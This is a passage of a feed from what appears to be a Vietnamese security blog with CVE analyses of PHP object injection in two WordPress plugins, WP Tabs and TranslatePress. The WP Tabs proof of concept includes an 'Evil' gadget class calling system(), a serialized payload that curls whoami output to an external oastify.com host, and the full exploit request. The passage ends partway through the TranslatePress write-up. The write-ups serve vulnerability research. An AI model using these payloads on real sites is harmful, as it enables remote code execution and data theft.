PHP theo mô tả của hàm:&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition quote open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Trích dẫn&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;@param $associative: When true , JSON objects will be returned as associative arrays; when false , JSON objects will be returned as objects. When null , JSON objects will be returned as associative arrays or objects depending on whether JSON_OBJECT_AS_ARRAY is set in the flags.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Sau đó &lt;code&gt;import( $shortcodes )&lt;/code&gt; được gọi với &lt;code&gt;$shortcodes&lt;/code&gt; là giá trị của &lt;code&gt;$data[&#39;shortcode&#39;]&lt;/code&gt;, ta có thể thấy được cấu trúc hiện tại của JSON cần upload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;shortcode&amp;#34;: {&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function import( $shortcodes ) {&#xA;    $errors = array();&#xA;    foreach ( $shortcodes as $index =&amp;gt; $shortcode ) {&#xA;        $errors[ $index ] = array();&#xA;        $new_tabs_id      = 0;&#xA;        try {&#xA;            ...&#xA;            if ( isset( $shortcode[&amp;#39;meta&amp;#39;] ) &amp;amp;&amp;amp; is_array( $shortcode[&amp;#39;meta&amp;#39;] ) ) {&#xA;                foreach ( $shortcode[&amp;#39;meta&amp;#39;] as $key =&amp;gt; $value ) {&#xA;                    if ( &amp;#39;sp_tab_source_options&amp;#39; === $key || &amp;#39;sp_tab_shortcode_options&amp;#39; === $key ) {&#xA;                        $sanitize_value = $this-&amp;gt;sanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( &amp;#39;{#ID#}&amp;#39;, $new_tabs_id, $value ) ) );&#xA;&#xA;                        update_post_meta(&#xA;                            $new_tabs_id,&#xA;                            $key,&#xA;                            $sanitize_value&#xA;                        );&#xA;&#xA;                    }&#xA;                }&#xA;            }&#xA;        } catch ( Exception $e ) {&#xA;            array_push( $errors[ $index ], $e-&amp;gt;getMessage() );&#xA;            // If there was a failure somewhere, clean up.&#xA;            wp_trash_post( $new_tabs_id );&#xA;        }&#xA;        ...&#xA;    }&#xA;&#xA;    $errors = reset( $errors );&#xA;    return isset( $errors[0] ) ? new WP_Error( &amp;#39;import_tabs_error&amp;#39;, $errors[0] ) : $shortcodes;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm duyệt qua các shortcode và kiểm tra &lt;code&gt;shortcode[&#39;meta&#39;]&lt;/code&gt; có tồn lại dưới dạng mảng hay không, nếu có sẽ duyệt từng phần từ trong mảng &lt;code&gt;$shortcode[&#39;meta&#39;]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$sanitize_value = $this-&amp;gt;sanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( &amp;#39;{#ID#}&amp;#39;, $new_tabs_id, $value ) ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu key là &lt;code&gt;sp_tab_source_options&lt;/code&gt; hoặc &lt;code&gt;sp_tab_shortcode_options&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Thay thế chuỗi &lt;code&gt;{#ID#}&lt;/code&gt; trong giá trị bằng &lt;code&gt;$new_tabs_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Gọi hàm &lt;code&gt;maybe_unserialize()&lt;/code&gt; để giải mã dữ liệu nếu nó đang ở dạng serialize.&lt;/li&gt;&#xA;&lt;li&gt;Gọi hàm &lt;code&gt;sanitize_and_collect_metabox_data()&lt;/code&gt; để lọc và chuẩn hóa dữ liệu.&lt;/li&gt;&#xA;&lt;li&gt;Cuối cùng, dùng &lt;code&gt;update_post_meta()&lt;/code&gt; để lưu dữ liệu đã xử lý vào bảng meta của post có ID &lt;code&gt;$new_tabs_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Như vậy ta có thể thấy nội dung JSON file cần upload là:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;shortcode&amp;#34;: {&#xA;    &amp;#34;shortcode1&amp;#34;: {&#xA;      &amp;#34;meta&amp;#34;: {&#xA;        &amp;#34;sp_tab_source_options&amp;#34;: &amp;#34;serialized_payload&amp;#34;&#xA;      }&#xA;    }&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Administrator uploads JSON via /wp-admin/admin-ajax.php?action=tabs_import_shortcode&amp;#34;] --&amp;gt; B[&amp;#34;import_shortcode() invoked&amp;#34;]&#xA;&#xA;B --&amp;gt; C{&amp;#34;Check nonce: wp_verify_nonce()&amp;#34;}&#xA;C --&amp;gt;|Fail| X[&amp;#34;Stop &amp;amp; return error: Nonce verification failed&amp;#34;]&#xA;C --&amp;gt;|Pass| D[&amp;#34;json_decode() twice → extract $shortcodes&amp;#34;]&#xA;&#xA;D --&amp;gt;|Empty/Invalid| Y[&amp;#34;Stop &amp;amp; return error: Nothing to import&amp;#34;]&#xA;D --&amp;gt;|Valid| E[&amp;#34;Call import($shortcodes)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Loop through each shortcode&amp;#34;]&#xA;F --&amp;gt; H{&amp;#34;Has &amp;#39;meta&amp;#39; and is array?&amp;#34;}&#xA;H --&amp;gt;|No| Z[&amp;#34;Skip entry&amp;#34;]&#xA;H --&amp;gt;|Yes| I[&amp;#34;Loop each meta field&amp;#34;]&#xA;&#xA;I --&amp;gt; J{&amp;#34;Key == &amp;#39;sp_tab_source_options&amp;#39; OR &amp;#39;sp_tab_shortcode_options&amp;#39;?&amp;#34;}&#xA;J --&amp;gt;|No| Z&#xA;J --&amp;gt;|Yes| K[&amp;#34;Replace {#ID#} with new ID&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;maybe_unserialize() ← Vulnerable&amp;#34;]&#xA;&#xA;L --&amp;gt; M{&amp;#34;Does unserialize create object?&amp;#34;}&#xA;M --&amp;gt;|Yes| R[&amp;#34;Object Injection → Possible RCE if malicious class exists&amp;#34;]&#xA;M --&amp;gt;|No| S[&amp;#34;Sanitize &amp;#43; update_post_meta() and continue&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo class để test đặt trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Import JSON file:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;shortcode&amp;#34;: {&#xA;    &amp;#34;shortcode1&amp;#34;: {&#xA;      &amp;#34;meta&amp;#34;: {&#xA;        &amp;#34;sp_tab_source_options&amp;#34;: &amp;#34;O:4:\&amp;#34;Evil\&amp;#34;:1:{s:7:\&amp;#34;command\&amp;#34;;s:75:\&amp;#34;curl http://m7uzxda0q6dtl9sp5pvah7vuilocc30s.oastify.com/?leadked=$(whoami)\&amp;#34;;}&amp;#34;&#xA;      }&#xA;    }&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: administrator_cookie&#xA;...&#xA;shortcode=%22%7B%5Cr%5Cn&amp;#43;&amp;#43;%5C%22shortcode%5C%22%3A&amp;#43;%7B%5Cr%5Cn&amp;#43;&amp;#43;&amp;#43;&amp;#43;%5C%22shortcode1%5C%22%3A&amp;#43;%7B%5Cr%5Cn&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;%5C%22meta%5C%22%3A&amp;#43;%7B%5Cr%5Cn&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;%5C%22sp_tab_source_options%5C%22%3A&amp;#43;%5C%22O%3A4%3A%5C%5C%5C%22Evil%5C%5C%5C%22%3A1%3A%7Bs%3A7%3A%5C%5C%5C%22command%5C%5C%5C%22%3Bs%3A75%3A%5C%5C%5C%22curl&amp;#43;http%3A%2F%2Fm7uzxda0q6dtl9sp5pvah7vuilocc30s.oastify.com%2F%3Fleadked%3D%24(whoami)%5C%5C%5C%22%3B%7D%5C%22%5Cr%5Cn&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;&amp;#43;%7D%5Cr%5Cn&amp;#43;&amp;#43;&amp;#43;&amp;#43;%7D%5Cr%5Cn&amp;#43;&amp;#43;%7D%5Cr%5Cn%7D%22&amp;amp;action=tabs_import_shortcode&amp;amp;nonce=b6d5e5977d&amp;amp;unSanitize=&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-11-24-cve-2025-48134/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-24-cve-2025-48134/result.png&#39; alt=&#34;Result&#34; height=&#34;578&#34; width=&#34;1136&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;CVE-2025-48134 xuất phát từ việc deserialization dữ liệu không đáng tin cậy thông qua &lt;code&gt;maybe_unserialize()&lt;/code&gt; trong quá trình import, cho phép PHP Object Injection và có thể dẫn đến RCE nếu tồn tại class nguy hiểm. Dù yêu cầu tài khoản Administrator và nonce hợp lệ, hậu quả vẫn nghiêm trọng khi bị khai thác. Phiên bản 2.2.13 đã sửa bằng cách không cho phép tạo object tùy ý khi unserialize.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nguyên nhân: deserialization dữ liệu input không kiểm soát.&lt;/li&gt;&#xA;&lt;li&gt;Hậu quả: Object Injection và Remote Code Execution.&lt;/li&gt;&#xA;&lt;li&gt;Cần quyền Administrator để khai thác.&lt;/li&gt;&#xA;&lt;li&gt;Không nên unserialize dữ liệu người dùng nếu không giới hạn class hoặc kiểm soát an toàn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-expand-tabs-free/vulnerability/wordpress-wp-tabs-2-2-11-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Tabs Plugin &amp;lt;= 2.2.12 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30773 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-23-cve-2025-30773/</link>
      <pubDate>Sun, 23 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-23-cve-2025-30773/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng Deserialization of Untrusted Data trong Cozmoslabs TranslatePress cho phép Object Injection. Vấn đề này ảnh hưởng đến TranslatePress: từ n/a cho đến phiên bản 2.9.6.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30773&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30773&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.9.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.9.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/translatepress-multilingual/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TranslatePress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;TranslatePress&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.6&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.7&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v2.9.6):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function trp_update_database(){&#xA;    if ( ! current_user_can( apply_filters(&amp;#39;trp_update_database_capability&amp;#39;, &amp;#39;manage_options&amp;#39;) ) ){&#xA;        $this-&amp;gt;stop_and_print_error( __(&amp;#39;Update aborted! Your user account doesn\&amp;#39;t have the capability to perform database updates.&amp;#39;, &amp;#39;translatepress-multilingual&amp;#39; ) );&#xA;    }&#xA;&#xA;    $nonce = isset( $_REQUEST[&amp;#39;trp_updb_nonce&amp;#39;] ) ? wp_verify_nonce( sanitize_text_field( $_REQUEST[&amp;#39;trp_updb_nonce&amp;#39;] ), &amp;#39;tpupdatedatabase&amp;#39; ) : false;&#xA;    if ( $nonce === false ){&#xA;        $this-&amp;gt;stop_and_print_error( __(&amp;#39;Update aborted! Invalid nonce.&amp;#39;, &amp;#39;translatepress-multilingual&amp;#39; ) );&#xA;    }&#xA;    ...&#xA;    $extra_params = isset( $_REQUEST[&amp;#39;trp_updb_extra_params&amp;#39;] ) ? unserialize(base64_decode(sanitize_text_field($_REQUEST[&amp;#39;trp_updb_extra_params&amp;#39;] ))) : array();&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong đoạn mã này, hàm &lt;strong&gt;&lt;code&gt;unserialize()&lt;/code&gt;&lt;/strong&gt; được gọi trực tiếp trên dữ liệu người dùng (&lt;code&gt;$_REQUEST[&#39;trp_updb_extra_params&#39;]&lt;/code&gt; sau khi loại bỏ HTML và giải mã base64). Điều này tạo ra lỗ hổng nghiêm trọng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nguy cơ Object Injection&lt;/strong&gt;: Nếu attacker chèn payload PHP object vào dữ liệu base64, quá trình decode và unserialize sẽ khởi tạo object độc hại, dẫn đến &lt;strong&gt;Object Injection&lt;/strong&gt; và có khả năng tiến tới &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Thiếu kiểm tra an toàn&lt;/strong&gt;: Không có bước xác thực dữ liệu trước khi thực hiện unserialize.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không có cơ chế fallback&lt;/strong&gt;: Nếu dữ liệu không hợp lệ hoặc bị lỗi, hệ thống không có phương án xử lý thay thế, khiến ứng dụng dễ bị khai thác.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá (v2.9.7):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; 